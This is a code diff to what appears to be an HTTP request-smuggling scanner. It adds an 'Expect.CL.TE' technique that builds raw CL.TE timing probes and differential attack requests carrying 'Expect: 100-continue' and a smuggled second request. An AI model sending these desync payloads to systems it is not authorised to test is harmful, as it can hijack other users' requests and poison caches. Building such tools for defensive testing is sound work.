@@ -18,6 +18,13 @@ Safe-testing ordering (criterion 4): CL.TE has ``safe_order`` 0 so it is always
 probed before TE.CL -- a TE.CL timing probe can hang and disrupt *other* users if
 the target is in fact CL.TE.
 
+v0.6 adds the ``Expect.CL.TE`` technique: a CL.TE probe that includes
+``Expect: 100-continue``.  Some front-ends send ``100 Continue`` before
+forwarding the body to the back-end; the raw-socket layer now skips 1xx interim
+responses so the hang (timing signal) is correctly measured even when ``100
+Continue`` precedes the timeout.  The differential attack confirms the desync
+using the same CL.TE logic.
+
 These are **request** builders: they never normalise anything. Response bytes are
 handled elsewhere and are treated as data (R5).
 """
@@ -33,6 +40,7 @@ __all__ = [
     "all_techniques",
     "technique_by_name",
     "DESYNC_REFERENCES",
+    "EXPECT_HEADER",
 ]
 
 DESYNC_REFERENCES: tuple[str, ...] = (
@@ -40,6 +48,12 @@ DESYNC_REFERENCES: tuple[str, ...] = (
     "https://portswigger.net/web-security/request-smuggling",
     "https://portswigger.net/web-security/request-smuggling/finding",
 )
+
+# The Expect: 100-continue header used in the Expect.CL.TE technique (v0.6).
+# Some front-ends send 100 Continue before forwarding to the back-end,
+# introducing a distinct timing profile that the raw sender's 1xx skipping
+# handles correctly.
+EXPECT_HEADER: bytes = b"Expect: 100-continue"
 
 # The Transfer-Encoding obfuscation dictionary for TE.TE: each entry is a raw
 # header line that a *lenient* parser reads as "chunked" but a *strict* parser
@@ -116,6 +130,10 @@ class Technique:
             ``TE.chunk`` chunk-body variant name), or ``None``.
         te_header: The raw Transfer-Encoding header bytes this technique uses
             (obfuscated for TE.TE, plain for CL.TE/TE.CL/TE.chunk).
+        extra_headers: Additional raw header lines (e.g. ``Expect: 100-continue``
+            for ``Expect.CL.TE``) inserted between the framing headers and the
+            blank line in both the timing probe and the differential attack.
+            Each entry is one complete ``Name: value`` line (bytes, no CRLF).
         timing_body: The raw chunk body appended after the headers in the
             timing probe. Defaults to the standard ``1\\r\\nA\\r\\nX`` probe.
         timing_cl: The Content-Length value in the timing probe; controls how
@@ -134,6 +152,7 @@ class Technique:
     variant: str | None = None
     te_header: bytes = _PLAIN_TE
     references: tuple[str, ...] = field(default=DESYNC_REFERENCES)
+    extra_headers: tuple[bytes, ...] = field(default_factory=tuple)
     timing_body: bytes = b"1\r\nA\r\nX"
     timing_cl: int = 4
     attack_prefix: bytes = b""
@@ -151,9 +170,13 @@ class Technique:
         (Content-Length), causing the back-end (TE) to attempt parsing
         ``self.timing_body[:timing_cl]`` as a chunked body. A back-end that
         cannot parse the chunk variant hangs or errors -- the timing signal.
+
+        Any ``extra_headers`` (e.g. ``Expect: 100-continue`` for the
+        ``Expect.CL.TE`` technique) are appended to the framing headers; they
+        appear on the wire after the CL/TE lines and before the blank line.
         """
         kind = self.name
-        if kind in ("CL.TE", "TE.TE", "TE.chunk"):
+        if kind in ("CL.TE", "TE.TE", "TE.chunk", "Expect.CL.TE"):
             # front uses Content-Length (timing_cl bytes forwarded), back uses
             # chunked and is left with an incomplete or malformed chunk -> hang.
             head = _crlf(
@@ -161,6 +184,7 @@ class Technique:
                 f"Host: {host}".encode(),
                 f"Content-Length: {self.timing_cl}".encode(),
                 self.te_header,
+                *self.extra_headers,
             )
             return head + self.timing_body
         if kind == "TE.CL":
@@ -171,6 +195,7 @@ class Technique:
                 f"Host: {host}".encode(),
                 b"Content-Length: 6",
                 _PLAIN_TE,
+                *self.extra_headers,
             )
             return head + b"0\r\n\r\nX"
         return None
@@ -182,7 +207,7 @@ class Technique:
         kind = self.name
         smuggled = _smuggled_request(host, marker_path)
 
-        if kind in ("CL.TE", "TE.TE"):
+        if kind in ("CL.TE", "TE.TE", "Expect.CL.TE"):
             # front (CL) forwards the whole body; back (chunked) stops at the
             # terminator, leaving the smuggled request as a prefix.
             body = b"0\r\n\r\n" + smuggled
@@ -191,6 +216,7 @@ class Technique:
                 f"Host: {host}".encode(),
                 f"Content-Length: {len(body)}".encode(),
                 self.te_header,
+                *self.extra_headers,
             )
             return head + body
 
@@ -297,6 +323,19 @@ def all_techniques() -> list[Technique]:
     """
     techs: list[Technique] = [
         Technique("CL.TE", "CL.TE", safe_order=0),
+        # Expect.CL.TE (v0.6): the same CL.TE discrepancy with an
+        # Expect: 100-continue header.  Probed immediately after CL.TE
+        # (safe_order=0) so both fire before TE.CL.  The raw sender's 1xx
+        # skipping ensures the timing signal comes from the back-end hang, not
+        # the front-end's 100 Continue interim response.
+        Technique(
+            "Expect.CL.TE",
+            "CL.TE",
+            safe_order=0,
+            variant="expect",
+            te_header=_PLAIN_TE,
+            extra_headers=(EXPECT_HEADER,),
+        ),
         Technique("CL.0", "CL.0", safe_order=1),
         # GET+CL:0 sub-variant: same discrepancy class, different probe shape.
         # Sends GET with Content-Length: 0 and the smuggled request appended.
